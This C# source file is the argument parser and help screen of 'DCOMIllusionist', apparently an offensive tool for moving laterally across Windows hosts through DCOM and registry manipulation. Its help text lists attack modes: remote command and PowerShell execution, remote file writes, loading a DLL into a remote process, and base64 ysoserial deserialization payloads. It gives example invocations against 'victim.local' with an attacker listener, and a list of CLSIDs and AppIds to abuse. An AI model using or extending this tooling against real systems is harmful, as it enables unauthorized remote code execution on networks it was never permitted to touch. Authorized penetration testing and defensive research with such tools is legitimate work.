using DCOMIllusionist.Core.Generators;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace DCOMIllusionist.Core.Helpers
{
    public static class ArgsParser
    {
        public static Options Parse(string[] args)
        {

            if (args.Length == 0)
            {
                ShowHelp();
                Environment.Exit(0);
            }

            var options = new Options();

            for (int i = 0; i < args.Length; i++)
            {
                var arg = args[i].ToLowerInvariant();

                switch (arg)
                {
                    case "-d":
                    case "--debug":
                        options.Debug = true;
                        Log.MinimumLevel = LogLevel.Debug;
                        break;

                    case "-h":
                    case "--help":
                        ShowHelp();
                        Environment.Exit(0);
                        break;

                    case "-t":
                    case "--target":
                        options.Target = GetValue(args, ref i, "--target");
                        break;

                    case "-p":
                    case "--port":
                        options.ListenPort = GetValue(args, ref i, "--port");
                        break;

                    case "-s":
                    case "--session":
                        options.Session = GetValue(args, ref i, "--session");
                        break;

                    case "--clsid":
                        options.CLSID = GetValue(args, ref i, "--clsid").Replace("{", "").Replace("}", "");
                        break;

                    case "--appid":
                        options.AppId = GetValue(args, ref i, "--appid").Replace("{", "").Replace("}", "");
                        break;

                    case "--attacker-sid":
                        options.AttackerSID = GetValue(args, ref i, "--attacker-sid");
                        break;

                    case "--no-port-check":
                        options.CheckPort = false;
                        break;

                    case "-g":
                    case "--gadget":
                        options.Gadget = GetValue(args, ref i, "--gadget");
                        break;

                    case "--ps-exec":
                        options.Arg.Cmd = Constants.POWERSHELL_BINARY;
                        options.Arg.Input = "-C " + GetValue(args, ref i, "--ps-exec");
                        options.ExploitType = Generators.ExploitType.Exec;
                        break;

                    case "-e":
                    case "--exec":
                        options.Arg.Cmd = GetValue(args, ref i, "--exec");
                        options.ExploitType = Generators.ExploitType.Exec;
                        break;

                    case "--exec-args":
                        options.Arg.Input = GetValue(args, ref i, "--exec-args");
                        break;

                    case "--curl":
                        options.Arg.Input = GetValue(args, ref i, "--curl");
                        options.ExploitType = Generators.ExploitType.Curl;
                        break;

                    case "--file-write-src":
                        options.Arg.Input = GetValue(args, ref i, "--file-write-src");
                        options.ExploitType = Generators.ExploitType.FileWrite;
                        break;

                    case "--file-write-dst":
                        options.Arg.FileWriteDst = GetValue(args, ref i, "--file-write-dst");
                        break;

                    case "--load-dll":
                        options.Arg.Input = GetValue(args, ref i, "--load-dll");
                        options.ExploitType = Generators.ExploitType.LoadDLL;
                        break;

                    case "--dll-class":
                        options.Arg.DLLClass = GetValue(args, ref i, "--dll-class");
                        break;

                    case "--dll-method":
                        options.Arg.DLLMethod = GetValue(args, ref i, "--dll-method");
                        break;

                    case "--yso-b64":
                        options.Arg.Input = GetValue(args, ref i, "--yso-b64");
                        options.ExploitType = Generators.ExploitType.B64Ysoserial;
                        break;

                    case "-l":
                    case "--listen":
                        options.Listen = GetValue(args, ref i, "--listen");
                        break;

                    case "--restore-backup":
                        options.RestoreRegistryBackup = GetValue(args, ref i, "--restore-backup");
                        break;

                    case "--local-registry-only":
                        options.LocalRegistryOnly = true;
                        break;

                    case "--remote-registry-only":
                        options.RemoteRegistryOnly = true;
                        break;

                    case "--test-network":
                        options.TestNetwork = true;
                        break;

                    case "--list-sessions":
                        options.ListSessions = true;
                        break;

                    case "--hku":
                        options.Hku = true;
                        break;

                    case "--skip-local-registry-setup":
                        options.SkipLocalRegistrySetup = true;
                        break;

                    case "--skip-remote-registry-setup":
                        options.SkipRemoteRegistrySetup = true;
                        break;

                    case "--fake-clsid":
                        options.FakeCLSID = true;
                        break;

                    default:
                        Log.Error($"Unknown argument: {arg}");
                        Environment.Exit(1);
                        break;
                }

                if (string.IsNullOrEmpty(options.Listen))
                {
                    options.Listen = Environment.MachineName + "." + IPGlobalProperties.GetIPGlobalProperties().DomainName;
                }

                if (!string.IsNullOrWhiteSpace(options.Session) && options.AppId.Equals(Constants.APPID_DEFAULT))
                    options.AppId = Constants.APPID_INTERACTIVE_DEFAULT;
            }

            return options;
        }

        public static string GetValue(string[] args, ref int index, string optionName)
        {
            if (index + 1 < args.Length && (!args[index + 1].StartsWith("-") || optionName.Equals("--exec-args")))
            {
                index++;
                return args[index];
            }

            Log.Error($"Error: {optionName} requires a value.");
            Environment.Exit(1);
            return string.Empty;
        }

        private static void ShowHelp()
        {
            ShowAsciiArt();
            Console.WriteLine(@"

Usage:
  DCOMIllusionist.exe [options] -t <target> (--ps-exec | --exec | --curl | --file-write-src | --load-dll | --yso-b64 | --test-network | --list-sessions)

Options:
  -h, --help                        Show this help message and exit
  -d, --debug                       Enable debug logging
  -t, --target <value>              Set the target hostname or IP
  -p, --port <value>                Set the target port (Default: 49765)
      --clsid <value>               Specify a CLSID (no curly braces)
      --appid <value>               Specify an AppID (no curly braces)
  -s, --session <value>             Provide a session identifier
   -l --listen <host>               Specify listener FQDN or IP
  -g, --gadget <value>              Specify gadget to use
      --attacker-sid <value>        Set the attacker's SID
      --no-port-check               Disable port availability check
      --restore-backup <path>       Restore registry from backup
      --local-registry-only         Only performs local registry modifications
      --remote-registry-only        Only performs remote registry modifications
      --skip-local-registry-setup   Skip local registry setup
      --skip-remote-registry-setup  Skip remote registry setup
      --hku                         Perform remote registry operations on HKCU instead of HKLM
      --fake-clsid                  Create fake CLSID with fake AppId

Attacks:
      --ps-exec <args>              Execute a command remotely using PSExec
      --exec <cmd>                  Execute a command remotely
      --exec-args <args>            Args to pass to the command
      --curl <url>                  Use curl-style web request payload
      --file-write-src <src>        File to write
      --file-write-dst <dst>        Destination path
      --load-dll <path>             Load a DLL into the remote process
      --dll-class <value>           Class in the DLL to execute (including namespace)
      --dll-method <value>          Static Method in the class to execute (Default: Run)
      --yso-b64 <b64>               Execute base64-encoded ysoserial payload
      --test-network                Check network access from target to attacker machine
      --list-sessions               List interactive sessions on the target

Examples:
    DCOMIllusionist.exe --target 192.168.1.10 --exec ""whoami""
    DCOMIllusionist.exe -t victim.local -p 1337 --listen other.attacker.local --load-dll ""payload.dll"" --dll-class ""Exploit"" --session 2

CLSID:
    BFFECCA7-4069-49F9-B5AB-7CCBB078ED91 - System.ServiceModel.Internal.TransactionBridge           (Default)
    2A7B042D-578A-4366-9A3D-154C0498458E - System.Management.Instrumentation.ManagedCommonProvider
    37708080-3519-4ED6-91D5-A64B643863FB - Windows.Help.Runtime.CatalogRead

AppId:
    577289B6-6E75-11DF-86F8-18A905160FE0 - Windows Push Notification Platform Connection Provider   (Default)
    63766597-1825-407D-8752-098F33846F46 - CentennialLifetimeManagerConsoleOperator
    06C792F8-6212-4F39-BF70-E8C0AC965C23 - User Account Control Settings                            (Interactive user)
    D4872B74-3AFC-47CD-B8A2-9E4F998539BC - Remote Cloud Store Factory                               (Interactive user)
    
");
        }

    public static void ShowAsciiArt()
        {
            Console.WriteLine(@"
    _____________________   _____________________
.-/|  78    ~~**~~       \ /       ~~**~~    79  |\-.
||||                      :                      ||||
||||                      :     DCOM casts       ||||
||||                      :   silent spells,     ||||
||||         The          :   turning code       ||||
||||         DCOM         :   to mystery.        ||||
||||      Illusionist     :   Behind the scenes, ||||
||||        ********      :   illusions rise,    ||||
||||                      :   crafting dreams    ||||
||||                      :   from whispered     ||||
||||                      :   bits.              ||||
||||              @hugow  :                      ||||
||||____________________  : _____________________||||
||/======================\:/======================\||
`-----------------------~___~----------------------''");
        }
    }
}
